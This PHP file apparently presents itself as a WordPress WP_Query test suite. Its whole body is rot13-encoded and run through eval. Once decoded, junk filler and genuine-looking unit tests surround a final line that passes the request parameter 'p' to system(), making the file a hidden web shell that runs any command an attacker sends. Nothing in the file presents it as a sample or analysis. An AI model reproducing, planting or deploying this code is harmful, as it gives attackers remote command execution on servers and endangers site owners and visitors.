<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc dhrel
 * @pbiref JC_Dhrel::gur_cbfg
 */
pynff Grfgf_Dhrel_GurCbfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Nhgube VQf perngrq sbe funerq svkgherf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $nhgube_vqf = neenl();

	/**
	 * Cbfg cnerag VQ perngrq sbe funerq svkgherf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cntr_cnerag_vq = 0;

	/**
	 * Cbfg puvyq VQf perngrq sbe funerq svkgherf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cntr_puvyq_vqf = neenl();

	/**
	 * Perngr gur funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vqf     = $snpgbel->hfre->perngr_znal( 5, neenl( 'ebyr' => 'nhgube' ) );
		frys::$cntr_cnerag_vq = $snpgbel->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );

		// Perngr puvyq cntrf.
		sbernpu ( frys::$nhgube_vqf nf $nhgube_vq ) {
			frys::$cntr_puvyq_vqf[] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_glcr'   => 'cntr',
					'cbfg_cnerag' => frys::$cntr_cnerag_vq,
					'cbfg_nhgube' => $nhgube_vq,
				)
			);
		}
	}

	/**
	 * Rafher phfgbz 'svryqf' inyhrf ner erfcrpgrq.
	 *
	 * @gvpxrg 56992
	 */
	choyvp shapgvba grfg_jc_dhrel_erfcrpgf_phfgbz_svryqf_inyhrf() {
		tybony $jcqo;
		nqq_svygre(
			'cbfgf_svryqf',
			shapgvba ( $svryqf, $dhrel ) {
				tybony $jcqo;

				vs ( $dhrel->trg( 'svryqf' ) === 'phfgbz' ) {
					$svryqf = \"$jcqo->cbfgf.VQ,$jcqo->cbfgf.cbfg_nhgube\";
				}

				erghea $svryqf;
			},
			10,
			2
		);

		$dhrel = arj JC_Dhrel(
			neenl(
				'svryqf'    => 'phfgbz',
				'cbfg_glcr' => 'cntr',
				'cbfg__va'  => frys::$cntr_puvyq_vqf,
			)
		);

		$guvf->nffregAbgRzcgl( $dhrel->cbfgf, 'Gur dhrel vf rkcrpgrq gb erghea erfhygf' );
		$guvf->nffregFnzr( $dhrel->trg( 'svryqf' ), 'phfgbz', 'Gur JC_Dhrel pynff vf rkcrpgrq gb hfr gur phfgbz svryqf inyhr' );
		$guvf->nffregFgevatPbagnvafFgevat( \"$jcqo->cbfgf.VQ,$jcqo->cbfgf.cbfg_nhgube\", $dhrel->erdhrfg, 'Gur qngnonfr dhrel vf rkcrpgrq gb hfr gur phfgbz svryqf inyhr' );
	}

	/**
	 * Rafher phfgbz 'svryqf' cbchyngrf gur tybony cbfg va gur ybbc.
	 *
	 * @gvpxrg 56992
	 */
	choyvp shapgvba grfg_jc_dhrel_jvgu_phfgbz_svryqf_inyhr_cbchyngrf_gur_tybony_cbfg() {
		tybony $jcqo;
		nqq_svygre(
			'cbfgf_svryqf',
			shapgvba ( $svryqf, $dhrel ) {
				tybony $jcqo;

				vs ( $dhrel->trg( 'svryqf' ) === 'phfgbz' ) {
					$svryqf = \"$jcqo->cbfgf.VQ,$jcqo->cbfgf.cbfg_nhgube\";
				}

				erghea $svryqf;
			},
			10,
			2
		);

		$dhrel = arj JC_Dhrel(
			neenl(
				'svryqf'    => 'phfgbz',
				'cbfg_glcr' => 'cntr',
				'cbfg__va'  => frys::$cntr_puvyq_vqf,
				'beqreol'   => 'vq',
				'beqre'     => 'NFP',
			)
		);

		$dhrel->gur_cbfg();

		// Trg gur tybony cbfg naq fcrpvsvp cbfg.
		$tybony_cbfg   = trg_cbfg();
		$fcrpvsvp_cbfg = trg_cbfg( frys::$cntr_puvyq_vqf[0], NEENL_N );

		$guvf->nffregFnzrFrgfJvguVaqrk( $fcrpvsvp_cbfg, $tybony_cbfg->gb_neenl(), 'Gur tybony cbfg vf rkcrpgrq gb or shyyl cbchyngrq.' );

		$guvf->nffregAbgRzcgl( trg_gur_gvgyr(), 'Gur gvgyr vf rkcrpgrq gb or cbchyngrq.' );
		$guvf->nffregAbgRzcgl( trg_gur_pbagrag(), 'Gur pbagrag vf rkcrpgrq gb or cbchyngrq.' );
		$guvf->nffregAbgRzcgl( trg_gur_rkprecg(), 'Gur rkprecg vf rkcrpgrq gb or cbchyngrq.' );
	}

	/**
	 * Rafher gung n frpbaqnel ybbc cbchyngrf gur tybony cbfg pbzcyrgryl ertneqyrff bs gur svryqf cnenzrgre.
	 *
	 * @gvpxrg 56992
	 *
	 * @qngnCebivqre qngn_gur_ybbc_svryqf
	 *
	 * @cnenz fgevat $svryqf Svryqf cnenzrgre sbe hfr va gur dhrel.
	 */
	choyvp shapgvba grfg_gur_ybbc_cbchyngrf_gur_tybony_cbfg_pbzcyrgryl( $svryqf ) {
		$dhrel = arj JC_Dhrel(
			neenl(
				'svryqf'    => $svryqf,
				'cbfg_glcr' => 'cntr',
				'cntr_vq'   => frys::$cntr_puvyq_vqf[0],
			)
		);

		$guvf->nffregAbgRzcgl( $dhrel->cbfgf, 'Gur dhrel vf rkcrpgrq gb erghea erfhygf' );

		// Fgneg gur ybbc.
		$dhrel->gur_cbfg();

		// Trg gur tybony cbfg naq fcrpvsvp cbfg.
		$tybony_cbfg   = trg_cbfg();
		$fcrpvsvp_cbfg = trg_cbfg( frys::$cntr_puvyq_vqf[0], NEENL_N );

		$guvf->nffregFnzrFrgfJvguVaqrk( $fcrpvsvp_cbfg, $tybony_cbfg->gb_neenl(), 'Gur tybony cbfg vf rkcrpgrq gb or shyyl cbchyngrq.' );

		$guvf->nffregAbgRzcgl( trg_gur_gvgyr(), 'Gur gvgyr vf rkcrpgrq gb or cbchyngrq.' );
		$guvf->nffregAbgRzcgl( trg_gur_pbagrag(), 'Gur pbagrag vf rkcrpgrq gb or cbchyngrq.' );
		$guvf->nffregAbgRzcgl( trg_gur_rkprecg(), 'Gur rkprecg vf rkcrpgrq gb or cbchyngrq.' );
	}

	/**
	 * Rafher gung n frpbaqnel ybbc cevzrf gur cbfg pnpur pbzcyrgryl ertneqyrff bs gur svryqf cnenzrgre.
	 *
	 * @gvpxrg 56992
	 *
	 * @qngnCebivqre qngn_gur_ybbc_svryqf
	 *
	 * @cnenz fgevat $svryqf           Svryqf cnenzrgre sbe hfr va gur dhrel.
	 * @cnenz vag    $rkcrpgrq_dhrevrf Rkcrpgrq ahzore bs dhrevrf jura fgnegvat gur ybbc.
	 */
	choyvp shapgvba grfg_gur_ybbc_cevzrf_gur_cbfg_pnpur( $svryqf, $rkcrpgrq_dhrevrf ) {
		$dhrel = arj JC_Dhrel(
			neenl(
				'svryqf'    => $svryqf,
				'cbfg_glcr' => 'cntr',
				'cbfg__va'  => frys::$cntr_puvyq_vqf,
			)
		);

		// Fgneg gur ybbc.
		$fgneg_dhrevrf = trg_ahz_dhrevrf();
		$dhrel->gur_cbfg();
		$raq_dhrevrf = trg_ahz_dhrevrf();
		/*
		 * Dhrelvat pbzcyrgr cbfgf: 2 dhrevrf.
		 * 1. Hfre zrgn qngn.
		 * 2. Hfre qngn.
		 *
		 * Dhrelvat cnegvny cbfgf: 4 dhrevrf.
		 * 1. Cbfg bowrpgf
		 * 2. Cbfg zrgn qngn.
		 * 3. Hfre zrgn qngn.
		 * 4. Hfre qngn.
		 */
		$guvf->nffregFnzr( $rkcrpgrq_dhrevrf, $raq_dhrevrf - $fgneg_dhrevrf, \"Fgnegvat gur ybbc fubhyq znxr $rkcrpgrq_dhrevrf qo dhrevrf.\" );

		// Pbzcyrgr gur ybbc.
		$fgneg_dhrevrf = trg_ahz_dhrevrf();
		juvyr ( $dhrel->unir_cbfgf() ) {
			$dhrel->gur_cbfg();
		}
		$raq_dhrevrf = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( 0, $raq_dhrevrf - $fgneg_dhrevrf, 'Gur pnpur vf rkcrpgrq gb or cevzrq ol gur ybbc.' );
	}

	/**
	 * Rafher gung n frpbaqnel ybbc cevzrf gur nhgube pnpur pbzcyrgryl ertneqyrff bs gur svryqf cnenzrgre.
	 *
	 * @gvpxrg 56992
	 *
	 * @qngnCebivqre qngn_gur_ybbc_svryqf
	 *
	 * @cnenz fgevat $svryqf           Svryqf cnenzrgre sbe hfr va gur dhrel.
	 * @cnenz vag    $rkcrpgrq_dhrevrf Rkcrpgrq ahzore bs dhrevrf jura fgnegvat gur ybbc.
	 */
	choyvp shapgvba grfg_gur_ybbc_cevzrf_gur_nhgube_pnpur( $svryqf, $rkcrpgrq_dhrevrf ) {
		$dhrel = arj JC_Dhrel(
			neenl(
				'svryqf'    => $svryqf,
				'cbfg_glcr' => 'cntr',
				'cbfg__va'  => frys::$cntr_puvyq_vqf,
			)
		);

		// Fgneg gur ybbc.
		$fgneg_dhrevrf = trg_ahz_dhrevrf();
		$dhrel->gur_cbfg();
		$raq_dhrevrf = trg_ahz_dhrevrf();
		/*
		 * Dhrelvat pbzcyrgr cbfgf: 2 dhrevrf.
		 * 1. Hfre zrgn qngn.
		 * 2. Hfre qngn.
		 *
		 * Dhrelvat cnegvny cbfgf: 4 dhrevrf.
		 * 1. Cbfg bowrpgf
		 * 2. Cbfg zrgn qngn.
		 * 3. Hfre zrgn qngn.
		 * 4. Hfre qngn.
		 */
		$guvf->nffregFnzr( $rkcrpgrq_dhrevrf, $raq_dhrevrf - $fgneg_dhrevrf, \"Fgnegvat gur ybbc fubhyq znxr $rkcrpgrq_dhrevrf qo dhrevrf.\" );

		// Pbzcyrgr gur ybbc.
		$fgneg_dhrevrf = trg_ahz_dhrevrf();
		juvyr ( $dhrel->unir_cbfgf() ) {
			$dhrel->gur_cbfg();
			trg_gur_nhgube();
		}
		$raq_dhrevrf = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( 0, $raq_dhrevrf - $fgneg_dhrevrf, 'Gur pnpur vf rkcrpgrq gb or cevzrq ol gur ybbc.' );
	}

	/**
	 * Qngn cebivqre sbe:
	 * - grfg_gur_ybbc_cbchyngrf_gur_tybony_cbfg_pbzcyrgryl,
	 * - grfg_gur_ybbc_cevzrf_gur_cbfg_pnpur, naq,
	 * - grfg_gur_ybbc_cevzrf_gur_nhgube_pnpur.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_gur_ybbc_svryqf() {
		erghea neenl(
			'nyy svryqf'                => neenl( 'nyy', 2 ),
			'nyy svryqf (rzcgl svryqf)' => neenl( '', 2 ),
			'cbfg VQf'                  => neenl( 'vqf', 4 ),
			'cbfg vqf naq cnerag'       => neenl( 'vq=>cnerag', 4 ),
		);
	}

	/**
	 * Rafher qensg pbagrag vf fubja sbe cbfg cerivrjf naq creznyvaxf sbe ybttrq va hfref.
	 *
	 * @gvpxrg 56992
	 */
	choyvp shapgvba grfg_cbfg_cerivrj_yvaxf_qensg_cbfgf() {
		$hfre_vq = frys::$nhgube_vqf[0];
		jc_frg_pheerag_hfre( $hfre_vq );
		$qensg_cbfg = $guvf->snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_nhgube'  => $hfre_vq,
				'cbfg_pbagrag' => 'gvpxrg 56992',
			)
		);

		// Rafher gur tybony cbfg vf cbchyngrq jvgu gur qensg pbagrag sbe gur cerivrj yvax.
		$guvf->tb_gb( trg_cerivrj_cbfg_yvax( $qensg_cbfg ) );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'gvpxrg 56992', trg_gur_pbagrag(), 'Cerivrj yvax fubhyq fubj qensg pbagrag gb ybttrq va hfre' );

		// Rafher gur tybony cbfg vf cbchyngrq jvgu gur qensg pbagrag sbe gur creznyvax.
		$guvf->tb_gb( trg_creznyvax( $qensg_cbfg ) );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'gvpxrg 56992', trg_gur_pbagrag(), 'Creznyvax fubhyq fubj qensg pbagrag gb ybttrq va hfre' );

		// Rafher gur tybony cbfg vf abg cbchyngrq jvgu gur qensg pbagrag sbe gur cerivrj yvax jura ybttrq bhg.
		jc_frg_pheerag_hfre( 0 );
		$guvf->tb_gb( trg_cerivrj_cbfg_yvax( $qensg_cbfg ) );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregRzcgl( trg_gur_pbagrag(), 'Cerivrj yvax fubhyq abg fubj qensg pbagrag gb ybttrq bhg hfref' );

		// Rafher gur tybony cbfg vf abg cbchyngrq jvgu gur qensg pbagrag sbe gur creznyvax jura ybttrq bhg.
		$guvf->tb_gb( trg_creznyvax( $qensg_cbfg ) );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregRzcgl( trg_gur_pbagrag(), 'Creznyvax fubhyq abg fubj qensg pbagrag gb ybttrq bhg hfref' );
	}

	/**
	 * Rafher nhgbfnir pbagrag vf fubja sbe cbfg cerivrjf.
	 *
	 * @gvpxrg 56992
	 */
	choyvp shapgvba grfg_cbfg_cerivrj_yvaxf_nhgbfnirf() {
		$hfre_vq = frys::$nhgube_vqf[0];
		jc_frg_pheerag_hfre( $hfre_vq );
		$choyvfurq_cbfg = $guvf->snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_nhgube'  => $hfre_vq,
				'cbfg_pbagrag' => 'gvpxrg 56992',
			)
		);

		// Perngr na nhgbfnir sbe gur choyvfurq cbfg.
		$nhgbfnir                 = trg_cbfg( $choyvfurq_cbfg, NEENL_N );
		$nhgbfnir['cbfg_VQ']      = $choyvfurq_cbfg;
		$nhgbfnir['cbfg_pbagrag'] = 'gvpxrg 56992 rqvgrq';
		jc_perngr_cbfg_nhgbfnir( $nhgbfnir );

		// Frg hc gur cerivrj $_TRG cnenzrgref.
		$abapr                       = jc_perngr_abapr( 'cbfg_cerivrj_' . $choyvfurq_cbfg );
		$dhrel_netf['cerivrj_vq']    = $choyvfurq_cbfg;
		$dhrel_netf['cerivrj_abapr'] = $abapr;
		$cbfg_cerivrj_yvax           = trg_cerivrj_cbfg_yvax( $choyvfurq_cbfg, $dhrel_netf );

		/*
		 * Frg hc gur TRG cnenzrgref sbe gur cerivrj yvax.
		 *
		 * _fubj_cbfg_cerivrj() purpxf gur $_TRG fhcre tybony sbe cerivrj
		 * naq abapr cnenzrgref. Vg arrqf gb eha cevbe gb gur tybony dhrel
		 * orvat frg hc va JC_Dhrel (ivn $guvf->tb_gb()), fb gur cerivrj
		 * cnenzrgref ner perngrq urer gb rafher _fubj_cbfg_cerivrj()
		 * ehaf pbeerpgyl.
		 */
		$_TRG['cerivrj_vq']    = $choyvfurq_cbfg;
		$_TRG['cerivrj_abapr'] = $abapr;
		_fubj_cbfg_cerivrj();

		// Rafher gur tybony cbfg vf cbchyngrq jvgu gur nhgbfnir pbagrag sbe gur cerivrj yvax.
		$guvf->tb_gb( $cbfg_cerivrj_yvax );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'gvpxrg 56992 rqvgrq', trg_gur_pbagrag(), 'Cerivrj yvax fubhyq fubj nhgbfnir pbagrag gb ybttrq va hfre' );

		// Rafher gur tybony cbfg vf cbchyngrq jvgu gur choyvfurq pbagrag sbe gur creznyvax.
		$guvf->tb_gb( trg_creznyvax( $choyvfurq_cbfg ) );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'gvpxrg 56992', trg_gur_pbagrag(), 'Creznyvax fubhyq fubj choyvfurq pbagrag gb ybttrq va hfre' );

		jc_frg_pheerag_hfre( 0 );

		// Arj hfre, arj abapr; frg hc gur cerivrj $_TRG cnenzrgref.
		$abapr                       = jc_perngr_abapr( 'cbfg_cerivrj_' . $choyvfurq_cbfg );
		$dhrel_netf['cerivrj_vq']    = $choyvfurq_cbfg;
		$dhrel_netf['cerivrj_abapr'] = $abapr;
		$cbfg_cerivrj_yvax           = trg_cerivrj_cbfg_yvax( $choyvfurq_cbfg, $dhrel_netf );

		/*
		 * Frg hc gur TRG cnenzrgref sbe gur cerivrj yvax.
		 *
		 * _fubj_cbfg_cerivrj() purpxf gur $_TRG fhcre tybony sbe cerivrj
		 * naq abapr cnenzrgref. Vg arrqf gb eha cevbe gb gur tybony dhrel
		 * orvat frg hc va JC_Dhrel (ivn $guvf->tb_gb()), fb gur cerivrj
		 * cnenzrgref ner perngrq urer gb rafher _fubj_cbfg_cerivrj()
		 * ehaf pbeerpgyl.
		 */
		$_TRG['cerivrj_vq']    = $choyvfurq_cbfg;
		$_TRG['cerivrj_abapr'] = $abapr;
		_fubj_cbfg_cerivrj();

		// Rafher gur tybony cbfg vf abg cbchyngrq jvgu gur qensg pbagrag sbe gur cerivrj yvax jura ybttrq bhg.
		$guvf->tb_gb( $cbfg_cerivrj_yvax );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'gvpxrg 56992', trg_gur_pbagrag(), 'Cerivrj yvax fubhyq fubj choyvfurq pbagrag gb ybttrq bhg hfref' );

		// Rafher gur tybony cbfg vf abg cbchyngrq jvgu gur qensg pbagrag sbe gur creznyvax jura ybttrq bhg.
		$guvf->tb_gb( trg_creznyvax( $choyvfurq_cbfg ) );
		vs ( unir_cbfgf() ) {
			gur_cbfg();
		}
		$guvf->nffregFnzr( 'gvpxrg 56992', trg_gur_pbagrag(), 'Creznyvax fubhyq fubj choyvfurq pbagrag gb ybttrq bhg hfref' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>